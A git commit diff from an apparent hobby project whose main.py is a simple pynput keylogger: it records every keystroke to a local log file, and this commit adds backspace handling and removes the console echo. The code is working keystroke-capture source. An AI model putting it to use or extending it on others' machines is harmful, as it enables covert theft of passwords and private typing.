a00c8b95bc8e9928b3d120ccc2b964c024bddad1
Michael <Michaelrbparker@gmail.com>
2022-10-27 16:50:43 +0100

    backspace works

--- main.py
+++ main.py
@@ -1,15 +1,20 @@
 from pynput.keyboard import Key, Listener
+import os
 
 def writefile(key):
     key = str(key)
     key = key.replace("'", "")
     key = key.replace("Key.enter", "\n")
     key = key.replace("Key.space", " ")
-    with open("log.txt", "a") as f:
-        f.write(key)
+    if key == "Key.backspace":
+        with open("log.txt", "rb+") as f:
+            f.seek(-1, os.SEEK_END)
+            f.truncate()
+    else:
+        with open("log.txt", "a") as f:
+            f.write(key)
 
 def onpress(key):
-    print(key)
     writefile(key)
 
 
